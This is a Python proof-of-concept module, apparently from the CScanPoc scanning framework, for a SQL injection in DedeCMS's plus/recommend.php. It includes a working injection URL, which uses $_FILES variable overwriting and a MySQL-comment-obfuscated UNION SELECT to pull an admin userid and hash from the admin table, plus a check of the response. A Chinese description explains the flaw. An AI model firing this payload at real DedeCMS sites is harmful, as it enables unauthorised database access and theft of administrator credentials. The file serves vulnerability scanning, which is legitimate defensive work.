# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0044'  # 平台漏洞编号，留空
    name = 'DedeCMS plus/recommend.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-28'  # 漏洞公布时间
    desc = '''
        DedeCMS 在/plus/recommend.php中存在注入漏洞，
        只要变量名不含cfg_|GLOBALS|_GET|_POST|_COOKIE就行了，利用上面的代码可以覆盖$_FILES，
        同时利用这句代码：
        $$_key = $_FILES[$_key]['tmp_name'] = str_replace("\\\\", "\\", $_FILES[$_key]['tmp_name']);[/php]
        就可以覆盖任意变量了，结合str_replace的替换，就可以带入单引号了，造成注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1346/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a8ae0a61-aa79-4fed-b9bf-47af17f64c67'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,md5(c))+from+`%23@__admin` limit+0,1),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6873'
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
